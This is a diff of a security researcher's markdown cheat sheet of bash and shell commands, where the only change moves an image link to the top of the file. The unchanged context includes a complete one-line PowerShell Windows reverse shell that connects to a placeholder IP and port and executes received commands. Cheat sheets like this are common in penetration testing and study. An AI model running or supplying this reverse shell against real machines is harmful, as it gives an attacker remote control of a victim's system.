@@ -2,6 +2,9 @@
 I decided to start collecting all the quick and dirty bash scripts I have created / found on the web during Security Research
 
 # General Syntax / Useful Commands
+
+![image](https://github.com/user-attachments/assets/684e7a37-8646-4c7f-97a8-a70920166e85)
+
 	• Available shells on the system look in 
 	
 	/etc/shells    
@@ -106,5 +109,3 @@ http://0.0.0.0:9200
 
 	• Windows Reverse shell
 powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
-![image](https://github.com/user-attachments/assets/684e7a37-8646-4c7f-97a8-a70920166e85)
